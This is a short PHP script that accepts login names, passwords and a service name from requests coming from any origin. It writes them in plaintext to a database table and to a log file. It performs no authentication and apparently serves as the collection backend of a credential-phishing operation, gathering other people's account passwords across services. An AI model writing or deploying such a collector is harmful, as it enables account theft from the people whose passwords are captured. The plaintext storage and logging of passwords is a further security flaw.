<?php

header("Access-Control-Allow-Origin: *");

require_once('config.php');

$dsn = $config['db_connection'] . ':host=' . $config['db_host'] . ';dbname=' . $config['db_name'];
$user = $config['db_user'];
$password = $config['db_password'];

$params = $_REQUEST;

if (!empty($_REQUEST['login']) || !empty($_REQUEST['pass']) || !empty($_REQUEST['service'])) {
    try {
        $pdo = new PDO($dsn, $user, $password);
        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
        $pdo->setAttribute(PDO::ATTR_DEFAULT_FETCH_MODE, PDO::FETCH_ASSOC);

        $service = !empty($params['service']) ? $params['service'] : '';
        $login = !empty($params['login']) ? $params['login'] : '';
        $pass = !empty($params['pass']) ? $params['pass'] : '';

        $stmt = $pdo->prepare('INSERT INTO logins (service, login, pass, timestamp) VALUES (:service, :login, :pass, :timestamp)');
        $stmt->execute([
            'service' => $service,
            'login' => $login,
            'pass' => $pass,
            'timestamp' => time(),
        ]);
    } catch (PDOException $e) {
        fn_log($e->getMessage());
    }
    fn_log('service:' . $service . ' login:' . $login . ' pass:' . $pass);
}

function fn_log($content = '')
{
    $text = date("Y-m-d H:i:s") . ' ' . $content . "\n";
    file_put_contents('log.log', $text, FILE_APPEND);
}
